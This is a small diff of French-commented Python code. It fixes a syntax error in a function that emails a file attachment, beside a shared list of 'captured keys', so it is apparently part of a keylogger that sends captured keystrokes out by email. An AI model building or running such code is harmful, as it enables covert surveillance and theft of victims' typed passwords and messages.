@@ -23,7 +23,7 @@ touche_captures = []
 lock = threading.Lock()  # Verrou pour synchroniser l'accès à touche_captures
 
 # Fonction pour envoyer un e-mail avec pièce jointe
-def send_email_with_attachment(smtp_server, smtp_port, from_email, password, to_email, subject, body, file_path)
+def send_email_with_attachment(smtp_server, smtp_port, from_email, password, to_email, subject, body, file_path):
     msg = MIMEMultipart()
     msg['From'] = from_email
     msg['To'] = to_email
